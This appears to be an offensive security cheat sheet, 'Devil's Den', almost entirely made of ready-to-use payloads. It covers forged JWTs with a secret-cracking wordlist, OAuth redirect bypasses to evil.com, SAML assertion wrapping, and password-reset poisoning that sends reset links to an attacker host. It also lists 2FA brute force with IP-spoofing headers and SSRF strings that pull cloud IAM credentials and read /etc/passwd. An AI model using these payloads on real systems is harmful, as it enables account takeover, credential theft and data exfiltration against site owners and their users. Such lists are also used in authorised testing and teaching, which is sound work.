# DEVIL'S DEN — AUTH ATTACKS + SSRF ARSENAL v1.0
# JWT · OAuth · SAML · 2FA · Password Reset · SSRF · Open Redirect · IDOR

---

## JWT ATTACKS

### Algorithm None Attack
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD.
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.PAYLOAD.
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.PAYLOAD.
eyJhbGciOiIiLCJ0eXAiOiJKV1QifQ.PAYLOAD.
```

### Weak Secrets Wordlist (hashcat -a 0 -m 16500 token.jwt list.txt)
```
secret
password
123456
admin
key
test
jwt
token
change_me
your-256-bit-secret
app_secret
application_secret
mykey
privatekey
s3cr3t
p@ssw0rd
letmein
qwerty
abc123
secret123
jwtSecret
JWT_SECRET
TOKEN_SECRET
API_SECRET
HMAC_SECRET
supersecret
verysecret
mysecret
thesecret
secretkey
flask_secret
django_secret_key
rails_secret
laravel_app_key
HS256_SECRET
signing_key
auth_secret
dev_secret
prod_secret
```

### RS256 → HS256 Algorithm Confusion
```bash
# 1. Get public key from: /.well-known/jwks.json
# 2. Re-sign with public key as HMAC secret:
python3 jwt_tool.py TOKEN -X k -pk public.pem
python3 -c "import jwt; print(jwt.encode({'sub':'1','role':'admin','exp':9999999999}, open('public.pem').read(), algorithm='HS256'))"
```

### kid Header Injections
```
{"alg":"HS256","kid":"' UNION SELECT 'attacker_key'-- "}
{"alg":"HS256","kid":"../../dev/null"}
{"alg":"HS256","kid":"../../../../../../../dev/null"}
{"alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space"}
# jwt_tool: python3 jwt_tool.py TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

### jku / x5u Server-Side Key Injection
```
{"alg":"RS256","jku":"https://attacker.interactsh.io/jwks.json"}
{"alg":"RS256","x5u":"https://attacker.interactsh.io/cert.pem"}
# jwt_tool: python3 jwt_tool.py TOKEN -X s -ju "https://attacker.interactsh.io/jwks.json"
```

### Admin Claim Injection (after signature bypass)
```json
{"role":"admin"}
{"is_admin":true}
{"sub":"1"}
{"exp":9999999999}
{"scope":"admin:all"}
{"permissions":["*"]}
{"groups":["admin","superuser"]}
{"user_type":"superadmin"}
```

---

## OAUTH ATTACKS

### State Parameter CSRF
```
# No state: Navigate directly to auth URL without state, attacker binds code to victim session
# Weak state: state=1234 | state=abc | state=0 | state=null
# Test: remove state param → flow still works? → vulnerable
```

### Redirect URI Bypass Payloads
```
https://trusted.com.evil.com
https://trusted.com%2fevil.com
https://trusted.com\evil.com
https://trusted.com?.evil.com
https://trusted.com#@evil.com
https://trusted.com@evil.com
https://evil.com/https://trusted.com
https://trusted.com%00.evil.com
https://trusted.com/callback/../redirect?url=https://evil.com
https://trusted.com/callback/../../evil.com
https://trusted.com/open-redirect?url=https://evil.com
https://trusted.com%2f@evil.com
https://evil.trusted.com
```

### Authorization Code Replay
```
# Use same code twice — if second also returns token → vulnerable
POST /oauth/token
code=SAME_CODE&client_id=X&client_secret=Y&redirect_uri=Z&grant_type=authorization_code
```

### PKCE Bypass
```
# S256 challenge: code_verifier not tied to session
# Test: generate code_challenge, complete auth, swap code_verifier
```

---

## SAML ATTACKS

### XML Signature Wrapping (XSW)
```xml
<!-- Insert unsigned evil assertion before signed one -->
<samlp:Response>
  <saml:Assertion ID="evil">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <!-- Original signed assertion -->
    <ds:Signature><!-- valid sig --></ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

### Comment Injection
```
# Username: admin<!--
# Assertion: <NameID>admin<!-- attacker@evil.com --></NameID>
# App reads text before comment → logs in as admin
```

### Recipient Bypass
```
# Grab assertion from Service A (same IdP) → replay at Service B
# No audience/recipient check → full SSO bypass
```

---

## PASSWORD RESET ATTACKS

### Host Header Poisoning
```
POST /forgot-password HTTP/1.1
Host: attacker.interactsh.io

POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.interactsh.io

POST /forgot-password HTTP/1.1
Host: target.com
X-Host: attacker.interactsh.io
```

### Parameter Pollution
```
email=victim@target.com&email=attacker@evil.com
email[]=victim@target.com&email[]=attacker@evil.com
email=victim%40target.com%0d%0aBcc:attacker@evil.com
```

### Predictable Token Patterns
```bash
echo -n "victim@target.com" | md5sum
echo -n "victim@target.com$(date +%s)" | md5sum
echo -n "victim@target.com" | base64
# Sequential: token=1001 → try 1002, 1003
# UUIDv1: predictable from timestamp+MAC → use uuid-brute
```

---

## 2FA BYPASS TECHNIQUES

### Step Skip — Direct Endpoint Access
```
# After step1 session (password OK), access /dashboard directly
# Remove 2FA cookie check, replay authenticated endpoints
```

### OTP Brute Force with Rate Limit Bypass
```
000000 → 999999 (all 6-digit codes)
# Rate limit bypass headers:
X-Forwarded-For: 1.1.1.{n}    (increment per request)
X-Real-IP: 2.2.2.{n}
CF-Connecting-IP: 3.3.3.{n}
True-Client-IP: 4.4.4.{n}
```

### Response Manipulation
```
# Intercept 2FA response, change:
{"success":false} → {"success":true}
HTTP 403 → HTTP 200
{"mfa_required":true} → {"mfa_required":false}
```

### Type Juggling Against 2FA
```json
{"otp": null}
{"otp": true}
{"otp": 0}
{"otp": []}
{"otp": ""}
{"otp": ["000000"]}
```

---

## SSRF — COMPLETE PAYLOAD LIBRARY

### AWS Metadata
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### GCP Metadata
```
http://metadata.google.internal/computeMetadata/v1/  [Metadata-Flavor: Google]
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Azure IMDS
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01  [Metadata: true]
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Other Cloud Providers
```
# DigitalOcean:
http://169.254.169.254/metadata/v1/
# Alibaba Cloud:
http://100.100.100.200/latest/meta-data/
# Oracle Cloud:
http://192.0.0.192/openstack/
http://169.254.169.254/opc/v1/instance/
```

### Localhost Bypass Variants
```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://0/
http://127.1/
http://0177.0.0.1/
http://2130706433/
http://0x7f000001/
http://[::ffff:127.0.0.1]/
http://127.0.0.1.xip.io/
http://localtest.me/
```

### Protocol Schemes
```
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_KEYS%20*%0d%0a
gopher://127.0.0.1:25/EHLO%20attacker%0d%0a
ftp://127.0.0.1:21/
ldap://127.0.0.1:389/
sftp://attacker.interactsh.io/
```

### SSRF Filter Bypasses
```
http://attacker.com@169.254.169.254/
http://169.254.169.254#.attacker.com
https://attacker.com → 302 → http://169.254.169.254/
http://[0:0:0:0:0:ffff:a9fe:a9fe]/
http://169.254.169.254%09/
http://169.254.169.254%00/
http://①⑥⑨。②⑤④。①⑥⑨。②⑤④/
```

### Internal Services to Target via SSRF
```
http://10.0.0.1:2375/   Docker API → RCE
http://10.0.0.1:6379/   Redis → RCE via CONFIG SET
http://10.0.0.1:8500/   Consul → service mesh takeover
http://10.0.0.1:8200/   Vault → secret extraction
http://10.0.0.1:9200/   Elasticsearch → data dump
http://10.0.0.1:5601/   Kibana → RCE (old versions)
http://10.0.0.1:10250/  Kubernetes kubelet → exec in pod
http://10.0.0.1:8001/   Kubernetes dashboard
http://kubernetes.default.svc/api/v1/secrets
http://10.0.0.1:4848/   GlassFish admin
http://10.0.0.1:4848/management/domain/
```

---

## OPEN REDIRECT PAYLOADS
```
//evil.com
///evil.com
/\\evil.com
https://evil.com
//evil.com/%2F..
javascript:alert(document.domain)
data:text/html,<script>location='https://evil.com'</script>
%0a//evil.com
%2f%2fevil.com
%252f%252fevil.com
?next=//evil.com
?return=https://evil.com
?goto=https://evil.com
?continue=https://evil.com
?redirect_uri=https://evil.com
?return_to=https://evil.com
?destination=https://evil.com
#https://evil.com
```

---

## IDOR — SYSTEMATIC TEST MATRIX
```
# 1. Direct ID in URL:
GET /api/users/VICTIM_ID
GET /api/orders/VICTIM_ID
GET /api/documents/VICTIM_ID

# 2. ID in body (array-wrapped):
{"user_id": ["VICTIM_ID"]}
{"ids": ["VICTIM_ID"]}

# 3. ID in body (object-wrapped):
{"user": {"id": "VICTIM_ID"}}

# 4. Old API version:
GET /api/v1/users/VICTIM_ID  (instead of /v3/)

# 5. HTTP method override:
POST /api/users/VICTIM_ID + X-HTTP-Method-Override: DELETE

# 6. Parameter pollution:
GET /api/profile?user_id=ME&user_id=VICTIM

# 7. Zero auth:
GET /api/users/VICTIM_ID  (no Authorization header)

# 8. Bulk endpoint:
POST /api/users/bulk {"ids":["ALL"]}
```

---

## MASS ASSIGNMENT — ALWAYS TEST THESE PARAMS
```
role=admin          is_admin=true       admin=1
is_superuser=true   is_staff=true       user_type=admin
plan=enterprise     tier=gold           subscription=premium
verified=true       email_verified=1    kyc_verified=true
balance=999999      credits=99999       wallet_balance=999999
daily_limit=null    spending_limit=0    bypass_2fa=true
banned=false        suspended=false     active=true
confirmed=true      two_factor_enabled=false
```
